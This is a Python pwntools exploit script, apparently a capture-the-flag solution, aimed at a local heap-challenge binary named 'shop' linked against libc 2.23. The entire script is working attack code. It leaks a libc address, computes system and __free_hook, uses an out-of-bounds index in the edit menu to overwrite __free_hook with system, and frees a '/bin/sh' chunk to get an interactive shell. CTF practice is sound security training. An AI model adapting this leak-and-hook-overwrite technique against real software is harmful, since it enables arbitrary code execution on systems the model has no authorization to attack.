from pwn import *

libc_name = './libc-2.23.so'
offset = 0x230


context.log_level = 'debug'
elf = ELF('./shop')

p= process('./shop')
libc = ELF(libc_name)


def add(size,name):
    p.recvuntil("Now, buy buy buy!")
    p.sendline('1')
    p.recvuntil("name?")
    p.sendline(str(size))
    p.recvuntil("What is your goods name?")
    p.send(name)

def delete(idx):
    p.recvuntil("Now, buy buy buy!")
    p.sendline('2')
    p.recvuntil("Which goods that you don't need?")
    p.sendline(str(idx) )


def edit(idx):
    p.recvuntil("Now, buy buy buy!")
    p.sendline('3') 
    p.recvuntil("Which goods you need to modify?")
    p.sendline(str(idx))
def edit_vul(context):
    p.recvuntil("Now, buy buy buy!")
    p.sendline('3') 
    p.recvuntil("Which goods you need to modify?")
    p.send(context)

for i in range(0x13):
    p.recvuntil("EMMmmm, you will be a rich man!")
    p.sendline('1')
    p.recvuntil("I will give you $9999, but what's the  currency type you want, RMB or Dollar?")
    p.sendline('a'*8)

pause()
p.recvuntil("EMMmmm, you will be a rich man!")
p.sendline('1')
p.recvuntil("I will give you $9999, but what's the  currency type you want, RMB or Dollar?")
p.sendline('b'*8)   
p.recvuntil("EMMmmm, you will be a rich man!")
p.sendline('3')


add(0x100,'p4nda') 
add(0x70,'/bin/sh\0') 
delete(0)  
add(0,'')
edit(2)

p.recvuntil('OK, what would you like to modify ')
libc_addr = u64(p.recv(6).ljust(8,'\0'))
libc.address = libc_addr- 0x10 - 344 -libc.symbols['__malloc_hook'] 
p.send('p4nda')
print '[+] leak',hex(libc_addr) 
print '[+] system',hex(libc.symbols['system']) 

edit( (0x202140+19*8 - 0x2021E0 )/8 &0xffffffffffffffff )
p.recvuntil('to?')
p.send('d'*8)
payload = (str((0x202140 - 0x2021E0 )/8 &0xffffffffffffffff)+'\n') 

payload+= (str(2)+'\n') 
payload+= (str(1)+'\n')

payload = payload.ljust(0x1000-0x20,'a')
payload+= p64(libc.symbols['__free_hook'])


edit_vul(payload)
p.recvuntil('to?')
p.send(p64(libc.symbols['system']))

p.interactive()
